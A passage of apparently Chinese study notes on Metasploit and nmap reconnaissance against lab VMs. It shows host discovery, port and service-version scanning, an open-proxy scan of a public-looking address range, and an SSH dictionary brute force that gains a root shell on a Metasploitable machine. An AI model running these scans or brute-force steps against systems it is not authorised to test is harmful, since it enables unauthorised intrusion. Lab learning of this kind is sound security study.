(af67818000010001000000000756455253494f4e0442494e440000100003c00c0010000300000005000d0c646e736d6173712d322e3531)</span><br><span class="line">[*] Discovered NetBIOS on 10.10.10.130:137 (ROOT-TVI862UBEH:&lt;00&gt;:U :ROOT-TVI862UBEH:&lt;20&gt;:U :WORKGROUP:&lt;00&gt;:G :WORKGROUP:&lt;1e&gt;:G :00:0c:29:94:e4:0e)</span><br><span class="line">[*] Discovered DNS on 10.10.10.254:53 (BIND 9.4.2)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h3 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap -PU -sn 10.10.10.0/24[*] exec: nmap -PU -sn 10.10.10.0/24</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-25 10:56 CST</span><br><span class="line">Nmap scan report for bogon (10.10.10.1)</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report for bogon (10.10.10.2)</span><br><span class="line">Host is up (0.00056s latency).</span><br><span class="line">MAC Address: 00:50:56:FE:22:F7 (VMware)</span><br><span class="line">Nmap scan report for bogon (10.10.10.128)</span><br><span class="line">Host is up (0.00082s latency).</span><br><span class="line">MAC Address: 00:0C:29:46:81:2D (VMware)</span><br><span class="line">Nmap scan report for bogon (10.10.10.129)</span><br><span class="line">Host is up (0.00079s latency).</span><br><span class="line">MAC Address: 00:0C:29:BA:5B:04 (VMware)</span><br><span class="line">Nmap scan report for bogon (10.10.10.130)</span><br><span class="line">Host is up (0.00066s latency).</span><br><span class="line">MAC Address: 00:0C:29:94:E4:0E (VMware)</span><br><span class="line">Nmap scan report for bogon (10.10.10.254)</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">MAC Address: 00:50:56:FD:FB:5C (VMware)</span><br><span class="line">Nmap scan report for bogon (10.10.10.200)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (7 hosts up) scanned in 3.91 seconds</span><br><span class="line"></span><br><span class="line">还有很多使用方法在其他笔记里</span><br></pre></td></tr></table></figure>
<h3 id="操作系统辨识"><a href="#操作系统辨识" class="headerlink" title="操作系统辨识"></a>操作系统辨识</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap -sV 10.10.10.254</span><br><span class="line">[*] exec: nmap -sV 10.10.10.254</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-25 11:08 CST</span><br><span class="line">Nmap scan report for bogon (10.10.10.254)</span><br><span class="line">Host is up (0.000064s latency).</span><br><span class="line">Not shown: 988 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         ProFTPD 1.3.1</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">23/tcp   open  telnet      Linux telnetd</span><br><span class="line">25/tcp   open  smtp        Postfix smtpd</span><br><span class="line">53/tcp   open  domain      ISC BIND 9.4.2</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span><br><span class="line">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span><br><span class="line">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span><br><span class="line">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">MAC Address: 00:0C:29:D7:13:2A (VMware)</span><br><span class="line">Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="端口扫描与服务类型探测"><a href="#端口扫描与服务类型探测" class="headerlink" title="端口扫描与服务类型探测"></a>端口扫描与服务类型探测</h2></blockquote>
<h3 id="Metasploit中的端口扫描器"><a href="#Metasploit中的端口扫描器" class="headerlink" title="Metasploit中的端口扫描器"></a>Metasploit中的端口扫描器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line">[!] Module database cache not built yet, using slow search</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                              Disclosure Date  Rank    Description</span><br><span class="line">   ----                                              ---------------  ----    -----------</span><br><span class="line">   auxiliary/scanner/http/wordpress_pingback_access                   normal  Wordpress Pingback Locator</span><br><span class="line">   auxiliary/scanner/natpmp/natpmp_portscan                           normal  NAT-PMP External Port Scanner</span><br><span class="line">   auxiliary/scanner/portscan/ack                                     normal  TCP ACK Firewall Scanner</span><br><span class="line">   auxiliary/scanner/portscan/ftpbounce                               normal  FTP Bounce Port Scanner</span><br><span class="line">   auxiliary/scanner/portscan/syn                                     normal  TCP SYN Port Scanner</span><br><span class="line">   auxiliary/scanner/portscan/tcp                                     normal  TCP Port Scanner</span><br><span class="line">   auxiliary/scanner/portscan/xmas                                    normal  TCP &quot;XMas&quot; Port Scanner</span><br><span class="line">   auxiliary/scanner/sap/sap_router_portscanner                       normal  SAPRouter Port Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf auxiliary(syn) &gt; set RHOSTS 10.10.10.254</span><br><span class="line">RHOSTS =&gt; 10.10.10.254</span><br><span class="line">msf auxiliary(syn) &gt; set THREADS 20</span><br><span class="line">THREADS =&gt; 20</span><br><span class="line"></span><br><span class="line">msf auxiliary(syn) &gt; run</span><br><span class="line"></span><br><span class="line">[*]  TCP OPEN 10.10.10.254:21</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:22</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:23</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:25</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:53</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:80</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:139</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:445</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:3306</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:3632</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:5432</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:8009</span><br><span class="line">[*]  TCP OPEN 10.10.10.254:8180</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h4 id="Nmap端口扫描"><a href="#Nmap端口扫描" class="headerlink" title="Nmap端口扫描"></a>Nmap端口扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap -sV -Pn 10.10.10.129</span><br><span class="line">[*] exec: nmap -sV -Pn 10.10.10.129</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-26 08:33 CST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 10.10.10.129</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.2.2</span><br><span class="line">22/tcp   open  ssh         OpenSSH 5.3p1 Debian 3ubuntu4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.14 ((Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp  open  imap        Courier Imapd (released 2008)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)</span><br><span class="line">5001/tcp open  java-rmi    Java RMI</span><br><span class="line">8080/tcp open  http-proxy?</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port5001-TCP:V=7.01%I=7%D=10/26%Time=59F12D51%P=x86_64-pc-linux-gnu%r(N</span><br><span class="line">SF:ULL,4,&quot;\xac\xed\0\x05&quot;);</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port8080-TCP:V=7.01%I=7%D=10/26%Time=59F12D65%P=x86_64-pc-linux-gnu%r(S</span><br><span class="line">SF:ocks5,6F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Apache-Coyot</span><br><span class="line">SF:e/1\.1\r\nDate:\x20Thu,\x2026\x20Oct\x202017\x2000:33:41\x20GMT\r\nConn</span><br><span class="line">SF:ection:\x20close\r\n\r\n&quot;);</span><br><span class="line">MAC Address: 00:0C:29:BA:5B:04 (VMware)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.03 seconds</span><br></pre></td></tr></table></figure>
<h3 id="Back-Track"><a href="#Back-Track" class="headerlink" title="Back Track"></a>Back Track</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Autoscan工具</span><br><span class="line">使用方法P90</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="服务的扫描与查点"><a href="#服务的扫描与查点" class="headerlink" title="服务的扫描与查点"></a>服务的扫描与查点</h2></blockquote>
<h3 id="Metasploit提供的模块"><a href="#Metasploit提供的模块" class="headerlink" title="Metasploit提供的模块"></a>Metasploit提供的模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search _version</span><br><span class="line">[!] Module database cache not built yet, using slow search</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                                     Disclosure Date  Rank    Description</span><br><span class="line">   ----                                                     ---------------  ----    -----------</span><br><span class="line">   auxiliary/fuzzers/ssh/ssh_version_15                                      normal  SSH 1.5 Version Fuzzer</span><br><span class="line">   auxiliary/fuzzers/ssh/ssh_version_2                                       normal  SSH 2.0 Version Fuzzer</span><br><span class="line">   auxiliary/fuzzers/ssh/ssh_version_corrupt                                 normal  SSH Version Corruption</span><br><span class="line">   auxiliary/gather/ibm_sametime_version                    2013-12-27       normal  IBM Lotus Sametime Version Enumeration</span><br><span class="line">   auxiliary/scanner/db2/db2_version                                         normal  DB2 Probe Utility</span><br><span class="line">   auxiliary/scanner/ftp/ftp_version                                         normal  FTP Version Scanner</span><br><span class="line">   auxiliary/scanner/h323/h323_version                                       normal  H.323 Version Scanner</span><br><span class="line">   auxiliary/scanner/http/coldfusion_version                                 normal  ColdFusion Version Scanner</span><br><span class="line">   auxiliary/scanner/http/http_version                                       normal  HTTP Version Detection</span><br><span class="line">   auxiliary/scanner/http/joomla_version                                     normal  Joomla Version Scanner</span><br><span class="line">   auxiliary/scanner/http/sap_businessobjects_version_enum                   normal  SAP BusinessObjects Version Detection</span><br><span class="line">   auxiliary/scanner/http/ssl_version                       2014-10-14       normal  HTTP SSL/TLS Version Detection (POODLE scanner)</span><br><span class="line">   auxiliary/scanner/imap/imap_version                                       normal  IMAP4 Banner Grabber</span><br><span class="line">   auxiliary/scanner/ipmi/ipmi_version                                       normal  IPMI Information Discovery</span><br><span class="line">   auxiliary/scanner/lotus/lotus_domino_version                              normal  Lotus Domino Version</span><br><span class="line">   auxiliary/scanner/mysql/mysql_version                                     normal  MySQL Server Version Enumeration</span><br><span class="line">   auxiliary/scanner/oracle/tnslsnr_version                 2009-01-07       normal  Oracle TNS Listener Service Version Query</span><br><span class="line">   auxiliary/scanner/pop3/pop3_version                                       normal  POP3 Banner Grabber</span><br><span class="line">   auxiliary/scanner/postgres/postgres_version                               normal  PostgreSQL Version Probe</span><br><span class="line">   auxiliary/scanner/printer/printer_version_info                            normal  Printer Version Information Scanner</span><br><span class="line">   auxiliary/scanner/sap/sap_mgmt_con_version                                normal  SAP Management Console Version Detection</span><br><span class="line">   auxiliary/scanner/scada/digi_addp_version                                 normal  Digi ADDP Information Discovery</span><br><span class="line">   auxiliary/scanner/scada/digi_realport_version                             normal  Digi RealPort Serial Server Version</span><br><span class="line">   auxiliary/scanner/smb/smb_version                                         normal  SMB Version Detection</span><br><span class="line">   auxiliary/scanner/smtp/smtp_version                                       normal  SMTP Banner Grabber</span><br><span class="line">   auxiliary/scanner/snmp/aix_version                                        normal  AIX SNMP Scanner Auxiliary Module</span><br><span class="line">   auxiliary/scanner/ssh/ssh_version                                         normal  SSH Version Scanner</span><br><span class="line">   auxiliary/scanner/telnet/lantronix_telnet_version                         normal  Lantronix Telnet Service Banner Detection</span><br><span class="line">   auxiliary/scanner/telnet/telnet_version                                   normal  Telnet Service Banner Detection</span><br><span class="line">   auxiliary/scanner/vmware/vmauthd_version                                  normal  VMWare Authentication Daemon Version Scanner</span><br><span class="line">   auxiliary/scanner/vxworks/wdbrpc_version                                  normal  VxWorks WDB Agent Version Scanner</span><br></pre></td></tr></table></figure>
<h3 id="Telnet服务扫描"><a href="#Telnet服务扫描" class="headerlink" title="Telnet服务扫描"></a>Telnet服务扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/telnet/telnet_version </span><br><span class="line">msf auxiliary(telnet_version) &gt; set RHOSTS 10.10.10.0/24</span><br><span class="line">RHOSTS =&gt; 10.10.10.0/24</span><br><span class="line">msf auxiliary(telnet_version) &gt; set THREADS 50</span><br><span class="line">THREADS =&gt; 50</span><br><span class="line">msf auxiliary(telnet_version) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Scanned  39 of 256 hosts (15% complete)</span><br><span class="line">[*] Scanned  52 of 256 hosts (20% complete)</span><br><span class="line">[*] Scanned  95 of 256 hosts (37% complete)</span><br><span class="line">[*] Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] Scanned 138 of 256 hosts (53% complete)</span><br><span class="line">[*] Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[*] Scanned 185 of 256 hosts (72% complete)</span><br><span class="line">[*] Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] Scanned 235 of 256 hosts (91% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h3 id="SSH服务扫描"><a href="#SSH服务扫描" class="headerlink" title="SSH服务扫描"></a>SSH服务扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf auxiliary(ssh_version) &gt; set RHOSTS 10.10.10.0/24</span><br><span class="line">RHOSTS =&gt; 10.10.10.0/24</span><br><span class="line">msf auxiliary(ssh_version) &gt; set THREADS 100</span><br><span class="line">THREADS =&gt; 100</span><br><span class="line">msf auxiliary(ssh_version) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Scanned 101 of 256 hosts (39% complete)</span><br><span class="line">[*] 10.10.10.129:22 SSH server version: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4 ( service.version=5.3p1 openssh.comment=Debian-3ubuntu4 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=10.04 )</span><br><span class="line">[*] Scanned 111 of 256 hosts (43% complete)</span><br><span class="line">[*] Scanned 157 of 256 hosts (61% complete)</span><br><span class="line">[*] 10.10.10.254:22 SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 ( service.version=4.7p1 openssh.comment=Debian-8ubuntu1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=8.04 )</span><br><span class="line">[*] Scanned 197 of 256 hosts (76% complete)</span><br><span class="line">[*] Scanned 198 of 256 hosts (77% complete)</span><br><span class="line">[*] Scanned 199 of 256 hosts (77% complete)</span><br><span class="line">[*] Scanned 200 of 256 hosts (78% complete)</span><br><span class="line">[*] Scanned 213 of 256 hosts (83% complete)</span><br><span class="line">[*] Scanned 237 of 256 hosts (92% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h3 id="Oracle数据库服务查点"><a href="#Oracle数据库服务查点" class="headerlink" title="Oracle数据库服务查点"></a>Oracle数据库服务查点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/oracle/tnslsnr_version</span><br><span class="line">msf auxiliary(tnslsnr_version) &gt; set RHOSTS 10.10.10.0/24</span><br><span class="line">RHOSTS =&gt; 10.10.10.0/24</span><br><span class="line">msf auxiliary(tnslsnr_version) &gt; set THREADS 100</span><br><span class="line">THREADS =&gt; 100</span><br><span class="line">msf auxiliary(tnslsnr_version) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Scanned 101 of 256 hosts (39% complete)</span><br><span class="line">[+] 10.10.10.130:1521 Oracle - Version: 32-bit Windows: Version 10.2.0.1.0 - Production</span><br><span class="line">[*] Scanned 106 of 256 hosts (41% complete)</span><br><span class="line">[*] Scanned 156 of 256 hosts (60% complete)</span><br><span class="line">[*] Scanned 192 of 256 hosts (75% complete)</span><br><span class="line">[*] Scanned 201 of 256 hosts (78% complete)</span><br><span class="line">[*] Scanned 203 of 256 hosts (79% complete)</span><br><span class="line">[*] Scanned 207 of 256 hosts (80% complete)</span><br><span class="line">[*] Scanned 208 of 256 hosts (81% complete)</span><br><span class="line">[*] Scanned 236 of 256 hosts (92% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h3 id="开放代理探测"><a href="#开放代理探测" class="headerlink" title="开放代理探测"></a>开放代理探测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(tnslsnr_version) &gt; use auxiliary/scanner/http/open_proxy</span><br><span class="line">msf auxiliary(open_proxy) &gt; set SITE www.google.com</span><br><span class="line">SITE =&gt; www.google.com</span><br><span class="line">msf auxiliary(open_proxy) &gt; set RHOSTS 24.25.24.1/24</span><br><span class="line">RHOSTS =&gt; 24.25.24.1/24</span><br><span class="line">msf auxiliary(open_proxy) &gt; set MULTIPORTS true</span><br><span class="line">MULTIPORTS =&gt; true</span><br><span class="line">msf auxiliary(open_proxy) &gt; set VERIFY_CONNECT true</span><br><span class="line">VERIFY_CONNECT =&gt; true</span><br><span class="line">msf auxiliary(open_proxy) &gt; set THREADS 100</span><br><span class="line">THREADS =&gt; 100</span><br><span class="line">msf auxiliary(open_proxy) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Scanned  83 of 256 hosts (32% complete)</span><br><span class="line">[*] Scanned  94 of 256 hosts (36% complete)</span><br><span class="line">[*] Scanned  95 of 256 hosts (37% complete)</span><br><span class="line">[*] Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[*] Scanned 190 of 256 hosts (74% complete)</span><br><span class="line">[*] Scanned 191 of 256 hosts (74% complete)</span><br><span class="line">[*] Scanned 206 of 256 hosts (80% complete)</span><br><span class="line">[*] Scanned 250 of 256 hosts (97% complete)</span><br><span class="line">[*] Scanned 255 of 256 hosts (99% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h3 id="SSH猜测与嗅探"><a href="#SSH猜测与嗅探" class="headerlink" title="SSH猜测与嗅探"></a>SSH猜测与嗅探</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(open_proxy) &gt; use auxiliary/scanner/ssh/ssh_login </span><br><span class="line">msf auxiliary(ssh_login) &gt; set USERNAME root</span><br><span class="line">USERNAME =&gt; root</span><br><span class="line">msf auxiliary(ssh_login) &gt; set PASS_FILE /root/zidian.txt</span><br><span class="line">PASS_FILE =&gt; /root/zidian.txt</span><br><span class="line">msf auxiliary(ssh_login) &gt; set THREADS 50</span><br><span class="line">THREADS =&gt; 50</span><br><span class="line">msf auxiliary(ssh_login) &gt; set RHOSTS 10.10.10.254</span><br><span class="line">RHOSTS =&gt; 10.10.10.254</span><br><span class="line">msf auxiliary(ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.254:22 SSH - Starting bruteforce</span><br><span class="line">[-] 10.10.10.254:22 SSH - Failed: &apos;root:123456&apos;</span><br><span class="line">[!] No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 10.10.10.254:22 SSH - Failed: &apos;root:&apos;</span><br><span class="line">[-] 10.10.10.254:22 SSH - Failed: &apos;root:toor&apos;</span><br><span class="line">[-] 10.10.10.254:22 SSH - Failed: &apos;root:4138848&apos;</span><br><span class="line">[+] 10.10.10.254:22 SSH - Success: &apos;root:ubuntu&apos; &apos;uid=0(root) gid=0(root) groups=0(root) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux &apos;</span><br><span class="line">#爆破成功，字典文件可以自己选择</span><br><span class="line">[*] Command shell session 1 opened (10.10.10.200:43118 -&gt; 10.10.10.254:22) at 2017-10-26 09:17:33 +0800</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
